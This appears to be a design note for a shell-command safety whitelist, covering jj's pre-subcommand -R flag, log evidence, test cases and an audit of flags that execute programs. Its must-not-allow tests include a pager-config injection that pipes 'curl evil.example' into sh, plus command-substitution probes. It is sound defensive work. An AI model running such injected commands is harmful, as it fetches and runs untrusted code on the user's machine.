# Design: `jj` global flags before the subcommand

Status: implemented 2026-07-27 (`rnrrlwul`)
Author: derived from the 2026-07-27 log triage
Scope: `commands.go` whitelist data only — no classifier/`spec.go` change

> This design shipped as written. Its lasting value is mostly the *follow-on*: the
> `jjCommonFlags()` audit at the end turned into a whitelist-wide exec-path sweep
> that found five shipped holes. See DESIGN.md "Flag values that are programs".

## Problem

`jj st` classifies allow; `jj -R /path/to/repo st` falls through. Same for every
whitelisted read-only `jj` subcommand. This is the single largest remaining
accelerator gap in the log corpus.

The cause is structural, not a missing flag name. `matchGNU` validates the tokens
*before* the first positional against the **parent** spec's `Flags`, then hands
the tail to the child via `dispatchSubcommand`, which re-parses with the child's
own flag set (`spec.go:255-262`). There is deliberately no flag inheritance
across that boundary. `-R`/`--repository` is currently declared only in
`jjCommonFlags()` (`commands.go:2039-2040`), which is attached to the
*subcommand* specs, while top-level `jjSpec()` (`commands.go:1969`) has no
`Flags` field at all. So `-R` is accepted *after* a subcommand
(`jj st -R /path`, already allowed) but rejected *before* one — and before is
where `jj` actually documents it, and where it is overwhelmingly written.

`gitSpec()` already solves the identical problem the intended way: it declares
`{Short: "C", TakesArg: true}` as a top-level flag alongside `Subcommands`
(`commands.go:1431-1436`). This design applies that existing pattern to `jj`.

## Evidence

From 1,746 fall-through records logged after `commands.go` last changed
(2026-06-11; earlier records were judged by a different whitelist and are
stale). Measured by walking each record's AST with the classifier's own parser
and counting flags appearing before the subcommand word:

| flag | occurrences |
|---|---|
| `-R` | 424 |
| `--no-pager` | 3 |
| `--help` | 1 |

`-R` is 99% of the pre-subcommand flag traffic. Broken down by the subcommand
that followed it:

| category | count | after the fix |
|---|---|---|
| read-only, subcommand already whitelisted (`log` 68, `diff` 35, `status` 24, `st` 9, `git remote` 5, `bookmark list` 3, `show` 2, `op log` 1) | **147** | allow |
| read-only, subcommand not yet whitelisted (`file show` 14, `file list` 9, `config get`/`config list` 2, `file annotate` 1) | 26 | still falls through (out of scope) |
| mutating (`commit` 134, `git fetch` 33, `new` 31, `bookmark create` 15, `git push` 15, `restore` 12, `rebase` 5, `describe`/`abandon`/`squash` 6) | 251 | still falls through (correct) |

**Expected win: 147 records**, ~8.4% of the still-falling corpus. Note the
headline "263 `jj -R` records" from the triage output is *not* the win — most of
it is `jj -R … commit`, which must keep falling through. Stating that plainly
because the raw blame tag overstates the payoff.

## Proposed change

Add a `Flags` field to the existing `jjSpec()`. Nothing else changes.

```go
func jjSpec() *commandSpec {
	return &commandSpec{
		Style: styleGNU,
		// Global options, which jj documents as appearing BEFORE the subcommand
		// (`jj -R <path> log`). matchGNU validates pre-subcommand tokens against
		// this parent flag set and does not inherit into Subcommands, so these
		// must be declared here even though jjCommonFlags() repeats -R/--repository
		// for the post-subcommand position (`jj log -R <path>`). Mirrors the
		// `git -C <path>` precedent in gitSpec().
		//
		// Deliberately EXCLUDED — see the shipped comment in commands.go for the
		// full rationale. One flag is excluded on a demonstrated exploit
		// (--config/--config-file, via ui.pager); the rest purely for zero
		// logged demand.
		Flags: []flagSpec{
			{Short: "R", Long: "repository", TakesArg: true},
			{Long: "no-pager"},
			{Long: "help"},
		},
		Subcommands: map[string]*commandSpec{
			// ... unchanged ...
		},
	}
}
```

`--ignore-working-copy` was proposed on a safety argument rather than log demand
(0 occurrences). **Dropped at sign-off** to hold the line at zero-demand flags;
the 147-record win does not depend on it.

## Corrections found during implementation

Three claims in the proposal above did not survive contact with jj 0.41:

1. **`--config-toml` does not exist** in jj 0.41 — it is `--config NAME=VALUE`
   (plus `--config-file`). A test case naming `--config-toml` would have pinned
   nothing, falling through on the unknown flag name rather than on the
   exclusion.
2. **`ui.editor` is the wrong exploit example.** `jj st` never launches an
   editor, so that pairing executes nothing. The real exec path is **`ui.pager`**,
   which fires on precisely the subcommands this change accelerates — `log`,
   `diff`, `show`, `op log` all paginate by default. Verified against jj 0.41 on
   a TTY: `jj --config 'ui.pager=["sh","-c","touch …; cat"]' log` created the
   marker file. This makes the config-flag exclusion load-bearing today, not
   defensive.
3. **`--ignore-immutable` was mis-sorted as unsafe.** It is inert before a
   read-only subcommand: doing harm needs a mutating subcommand, none is in
   `Subcommands`, and `dispatchSubcommand` misses either way — the same argument
   this doc makes in "Why this cannot widen the allow set". There is no exploit
   against a currently whitelisted subcommand, so it belongs with the
   zero-demand exclusions. It becomes load-bearing only if a mutating subcommand
   is ever added.

## Why this cannot widen the allow set beyond the intent

The safety argument rests on `dispatchSubcommand` being the only route past the
parent spec (`spec.go:285-297`): it looks the subcommand up in `Subcommands` and
returns `false` on a miss. Adding a parent flag changes *which prefixes are
tolerated on the way to that lookup*; it cannot add a subcommand. `jj commit`,
`jj new`, `jj git push` are absent from the map and stay absent, so
`jj -R /tmp commit` still falls through — only now it is rejected at the
subcommand lookup rather than at the `-R` token. Same verdict, different line.

`-R`'s value is consumed as a required flag argument and is never re-examined as
a positional, and `argTokens` already refuses a substituted value for any flag
(`spec.go:213-215`), so `jj -R "$(…)" st` cannot smuggle an expansion in.

## Verification

Prototyped against the real classifier (`safeCommands["jj"]` swapped for the
proposed spec) — 10 must-allow and 18 must-fall-through forms, all as intended:

allowed: `jj -R <path> st` · `jj -R <path> log` ·
`jj -R ~/src/some-repo log -r '@' --no-graph -T 'x'` ·
`jj --repository /tmp/x diff --stat` · `jj -R /tmp bookmark list` ·
`jj -R /tmp git remote list` · `jj -R /tmp op log` · `jj --no-pager log` · `jj st`

still falling: `jj -R /tmp commit -m x` · `jj -R /tmp new @-` ·
`jj -R /tmp git push` · `jj -R /tmp git fetch` · `jj -R /tmp bookmark create foo` ·
`jj -R /tmp bookmark move master --to @-` · `jj -R /tmp restore file` ·
`jj -R /tmp describe -m x` · `jj -R /tmp rebase -d @-` · `jj -R /tmp abandon` ·
`jj -R /tmp squash` · `jj -R /tmp config set x y` · `jj -R /tmp op undo` ·
`jj -R /tmp file track x` · `jj -R "$(echo /tmp)" st` · `jj -R /tmp` (no
subcommand) · `jj -R` · `jj --repository`

### Test cases to land with the change

`TestMustAllow` — `jj -R /tmp st`, `jj --repository /tmp log`,
`jj -R /tmp diff --stat`, `jj -R /tmp bookmark list`, `jj -R /tmp git remote list`,
`jj --no-pager log`.

`TestMustNotAllow` (the wall — these are the ones that would matter if the parent
flag set ever leaked into subcommand dispatch) — `jj -R /tmp commit -m x`,
`jj -R /tmp new @-`, `jj -R /tmp git push`, `jj -R /tmp git fetch`,
`jj -R /tmp bookmark move master --to @-`, `jj -R /tmp restore f`,
`jj -R /tmp config set x y`, `jj -R /tmp op undo`, `jj -R "$(echo /tmp)" st`,
`jj -R /tmp`, `jj -R`, plus these to pin the deliberate exclusions:
`jj --config 'ui.pager=["sh","-c","curl evil.example|sh"]' log`,
`jj --config-file /tmp/evil.toml log`, `jj --ignore-immutable st`.

`TestNotYetAllowed` (harmless as written, blocked only by a missing feature) —
`jj -R /tmp file show master:go.mod`, `jj -R /tmp file list`,
`jj -R /tmp config list`. These are the 26 read-only records this change does
*not* unlock; they need their own subcommand specs.

## Known cosmetic wart

`jj -R=/tmp st` classifies allow, because `matchGNU` accepts `=`-joined values on
short flags. Real `jj` rejects that syntax, so the command errors out
harmlessly — nothing is executed that wouldn't have been. Not worth a classifier
change; noted so it isn't mistaken for a finding later.

## Follow-on: two exec paths found in `jjCommonFlags()`

Auditing the *post*-subcommand flag set for the same config gap turned up two
shipped holes unrelated to this change — `--tool` (arbitrary execution,
verified) and `--config-toml` (config injection, inert only by jj-version
accident). Both removed and pinned in `TestMustNotAllow`.

That finding generalised into a rule and a sweep of every arg-taking flag in the
whitelist, which went on to remove `sort --compress-program`,
`nix eval --expr/--file/--apply` and `git --textconv/--filters` — **five shipped
exec paths in total**, across four tools, in data that had been reviewed before.
Because the rule applies to every command and not just `jj`, it lives in
**DESIGN.md, "Flag values that are programs"** — with the full results, the
`--random-source` counter-example, and the `awk` audit that came back clean —
rather than here. The checklist form is README "Extending the whitelist" step 2,
and the work still outstanding is FUTURE-WORK.md §9.

Commits: `smklrruo` (the first four), `lwyxtnnr` (git `--textconv`).

## Out of scope

`sed` (67 records) and `pgrep` (44) are missing commands, not flag gaps, and
`sed` needs its own analysis (`-i` writes in place, the `w` command writes from
inside a script). `journalctl -b -1` (14) is a genuine `matchGNU` edge case:
`-b` is `OptionalArg` and `-1` is consumed as a flag cluster rather than its
value. Each wants a separate design.
